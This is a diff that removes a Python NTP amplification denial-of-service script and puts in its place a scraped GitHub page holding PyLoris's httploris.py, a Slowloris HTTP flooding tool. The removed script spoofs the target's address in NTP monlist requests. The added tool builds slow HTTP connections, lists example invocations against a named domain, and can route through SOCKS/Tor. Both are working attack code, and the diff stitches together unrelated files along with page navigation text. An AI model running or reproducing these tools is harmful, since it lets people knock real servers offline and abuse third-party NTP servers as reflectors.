@@ -1,83 +1,180 @@
-#!/usr/bin/env python
+Skip to content
+wenfengshi
+/
+ddos-dos-tools
+Public
+Code
+Issues
+5
+Pull requests
+2
+Actions
+Projects
+Wiki
+Security
+Insights
+ddos-dos-tools/pyloris/httploris.py
+@wenfengshi
+wenfengshi add
+ 1 contributor
+152 lines (116 sloc)  7.98 KB
+#! /usr/bin/env python
 
-from scapy.all import *
+"""
+httploris.py
+This is the current version of the original functionality of pyloris. This script
+is invoked quite similarly to the original pyloris.py; however, some of the arguemnts
+have changed. Use httploris.py --help to see the current features supported.
+[EXAMPLE] A basic test:
+httploris.py motomastyle.com
+[EXAMPLE] A basic test over HTTPS
+httploris.py motomastyle.com --ssl -p 443
+[EXAMPLE] A continuous test:
+httploris.py motomastyle.com -c 0
+[EXAMPLE] An angry test:
+httploris.py motomastyle.com -c 0 -k -P "/index.html" -s 500000 -w 0.5 -b 0.5 -r POST -u "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.33 Safari/530.5"
+[EXAMPLE] A test through SOCKS5 (i.e. Vidalia):
+httploris.py motomastyle.com --socksversion 5 --sockshost 127.0.0.1 --socksport 9050
+"""
+
+import optparse
 import sys
-import threading
 import time
-import random    # For Random source port
 
-#NTP Amp DOS attack
-#usage ntpdos.py <target ip> <ntpserver list> <number of threads> ex: ntpdos.py 1.2.3.4 file.txt 10
-#FOR USE ON YOUR OWN NETWORK ONLY
+from libloris import *
 
-#packet sender
-def deny():
-    #Import globals to function
-    global ntplist
-    global currentserver
-    global data
-    global target
-    ntpserver = ntplist[currentserver] #Get new server
-    currentserver = currentserver + 1 #Increment for next
-    packet = IP(dst=ntpserver,src=target)/UDP(sport=random.randint(2000,65535),dport=123)/Raw(load=data) #BUILD IT
-    send(packet,loop=1) #SEND IT
+def parse_options():
+    parser = optparse.OptionParser(usage = "%prog [options] www.host.com")
+    parser.add_option("-a", "--attacklimit", action = "store", type = "int", dest = "attacklimit", default = 500, help = "Total number of connections to make (0 = unlimited, default = 500)")
+    parser.add_option("-c", "--connectionlimit", action = "store", type = "int", dest = "connectionlimit", default = 500, help = "Total number of concurrent connections to allow (0 = unlimited, default = 500)")
+    parser.add_option("-t", "--threadlimit", action = "store", type = "int", dest = "threadlimit", default = 50, help = "Total number of concurrent threads (0 = unlimited, default = 50)")
+    parser.add_option("-b", "--connectionspeed", action = "store", type = "float", dest = "connectionspeed", default = 1, help = "Individual connection bandwidth in bytes per second (default = 1)")
 
-#So I dont have to have the same stuff twice
-def printhelp():
-    print "NTP Amplification DOS Attack"
-    print "By DaRkReD"
-    print "Usage ntpdos.py <target ip> <ntpserver list> <number of threads>"
-    print "ex: ex: ntpdos.py 1.2.3.4 file.txt 10"
-    print "NTP serverlist file should contain one IP per line"
-    print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS"
-    exit(0)
+    parser.add_option("-f", "--finish", action = "store_true", dest = "finish", default = False, help = "Complete each session rather than leave them unfinished (lessens the effectiveness, increases bandwidth usage)")
+    parser.add_option("-k", "--keepalive", action = "store_true", dest = "keepalive", default = False, help = "Turn Keep-Alive on")
 
-try:
-    if len(sys.argv) < 4:
-        printhelp()
-    #Fetch Args
-    target = sys.argv[1]
+    parser.add_option("-p", "--port", action = "store", type = "int", dest = "port", default = 80, help = "Port to initiate attack on (default = 80)")
+    parser.add_option("-P", "--page", action = "store", type = "string", dest="page", default = '/', help = "Page to request from the server (default = /)")
+    parser.add_option("-q", "--quit", action = "store_true", dest = "quit", default = False, help = "Quit without receiving data from the server (can shorten the duration of the attack)")
+    parser.add_option("-r", "--requesttype", action = "store", type = "string", dest = "requesttype", default = 'GET', help = "Request type, GET, HEAD, POST, PUT, DELETE, OPTIONS, or TRACE (default = GET)")
+    parser.add_option("-R", "--referer", action = "store", type = "string", dest = "referer", default = '', help = "Set the Referer HTTP header.")
+    parser.add_option("-s", "--size", action = "store", type = "int", dest = "size", default = 0, help = "Size of data segment to attach in cookie (default = 0)")
+    parser.add_option("-S", "--ssl", action = "store_true", dest = "ssl", default = False, help = "Use SSL/TLS connection (for HTTPS testing)")
+    parser.add_option("-u", "--useragent", action = "store", type = "string", dest = "useragent", default = 'pyloris.sf.net', help = "The User-Agent string for connections (defaut = pyloris.sf.net)")
+    parser.add_option("-z", "--gzip", action = "store_true", dest = "gzip", default = False, help = "Request compressed data stream")
 
-    #Help out idiots
-    if target in ("help","-h","h","?","--h","--help","/?"):
-        printhelp()
+    parser.add_option("-w", "--timebetweenthreads", action = "store", type = "float", dest = "timebetweenthreads", default = 0, help = "Time to wait between spawning threads in seconds (default = 0)")
+    parser.add_option("-W", "--timebetweenconnections", action = "store", type = "float", dest = "timebetweenconnections", default = 1, help = "Time to wait in between starting connections (default = 1)")
 
-    ntpserverfile = sys.argv[2]
-    numberthreads = int(sys.argv[3])
-    #System for accepting bulk input
-    ntplist = []
-    currentserver = 0
-    with open(ntpserverfile) as f:
-        ntplist = f.readlines()
+    parser.add_option("", "--socksversion", action = "store", type = "string", dest = "socksversion", default = '', help = "SOCKS version, SOCKS4, SOCKS5, or HTTP. Reqires --sockshost and --socksport")
+    parser.add_option("", "--sockshost", action = "store", type = "string", dest = "sockshost", default = '127.0.0.1', help = "SOCKS host address (default = 127.0.0.1)")
+    parser.add_option("", "--socksport", action = "store", type = "int", dest = "socksport", default = 0, help = "SOCKS port number")
+    parser.add_option("", "--socksuser", action = "store", type = "string", dest = "socksuser", default = '', help = "SOCKS username")
+    parser.add_option("", "--sockspass", action = "store", type = "string", dest = "sockspass", default = '', help = "SOCKS password")
 
-    #Make sure we dont out of bounds
-    if  numberthreads > int(len(ntplist)):
-        print "Attack Aborted: More threads than servers"
-        print "Next time dont create more threads than servers"
-        exit(0)
+    parser.add_option("-v", "--verbosity", action = "store", type = "int", dest = "verbosity", default = 1, help = "Verbosity level")
 
-    #Magic Packet aka NTP v2 Monlist Packet
-    data = "\x17\x00\x03\x2a" + "\x00" * 4
+    (options, args) = parser.parse_args()
 
-    #Hold our threads
-    threads = []
-    print "Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads"
-    print "Use CTRL+C to stop attack"
+    sys.stdout.write("PyLoris, a Python implementation of the Slowloris attack (http://ha.ckers.org/slowloris).\r\n")
 
-    #Thread spawner
-    for n in range(numberthreads):
-        thread = threading.Thread(target=deny)
-        thread.daemon = True
-        thread.start()
+    if len(args) != 1:
+        sys.stderr.write("No host supplied or incorrect number of arguments used.\nUse -h or --help for more information\n")
+        print args
+        sys.exit(1)
+    
+    OptionSet = DefaultOptions()
 
-        threads.append(thread)
+    OptionSet['host'] = args[0]
+    OptionSet['port'] = options.port
+    OptionSet['ssl'] = options.ssl
+    OptionSet['attacklimit'] = options.attacklimit
+    OptionSet['connectionlimit'] = options.connectionlimit
+    OptionSet['threadlimt'] = options.threadlimit
+    OptionSet['timebetweenthreads'] = options.timebetweenthreads
+    OptionSet['timebetweenconnections'] = options.timebetweenconnections
+    OptionSet['connecitonspeed'] = options.connectionspeed
+    OptionSet['socksversion'] = options.socksversion
+    OptionSet['sockshost'] = options.sockshost
+    OptionSet['socksport'] = options.socksport
+    OptionSet['socksuser'] = options.socksuser
+    OptionSet['sockspass'] = options.sockspass
+    OptionSet['quitimmediately'] = options.quit
 
-    #In progress!
-    print "Sending..."
+    requesttype = options.requesttype.upper()
+    if requesttype not in ('GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE'):
+        sys.stderr.write('Invalid request type.\nUse -h or --help for more information')
+        sys.exit(3)
 
-    #Keep alive so ctrl+c still kills all them threads
-    while True:
-        time.sleep(1)
-except KeyboardInterrupt:
-    print("Script Stopped [ctrl + c]... Shutting down")
-    # Script ends here
+    request = '%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s' % (requesttype, options.page, args[0], options.useragent)
+
+    if options.keepalive == True:
+        request += '\r\nKeep-Alive: 300\r\nConnection: Keep-Alive'
+
+    if options.gzip == True:
+        request += '\r\nAccept-Encoding: gzip'
+
+    if options.referer != '':
+        request += '\r\nReferer: %s' % (options.referer)
+
+    if options.size > 0:
+        request += '\r\nCookie: '
+        if options.size > 100:
+            count = options.size / 100
+            for i in range(int(count)):
+                request += ('data%i=%s ' % (i, 'A' * 100))
+            request += 'data=' + ('A' * 100)
+        else:
+            request += 'data=' + ('A' * options.size)
+
+    if options.finish == True:
+        print("Specifying the -f or --finish flags can reduce the effectiveness of the test and increase bandwidth usage.")
+        request += '\r\n\r\n'
+
+    OptionSet['request'] = request
+
+    return OptionSet
+
+if __name__ == "__main__":
+    options = parse_options()
+    loris = Loris()
+    loris.LoadOptions(options)
+    loris.start()
+    time.sleep(1)
+
+    while loris.running:
+        status = loris.status()
+
+        try:
+            while True:
+                message = loris.messages.get()
+                print(message)
+        except:
+            pass
+
+        try:
+            while True:
+                error = loris.errors.get()
+                print(error)
+        except:
+            pass
+
+        print('Pyloris has started %i attacks, with %i threads and %i connections currently running.' % status)
+    status = loris.status()
+    print('Pyloris has completed %i attacks.' % (status[0]))
+
+
+Footer
+© 2022 GitHub, Inc.
+Footer navigation
+Terms
+Privacy
+Security
+Status
+Docs
+Contact GitHub
+Pricing
+API
+Training
+Blog
+About
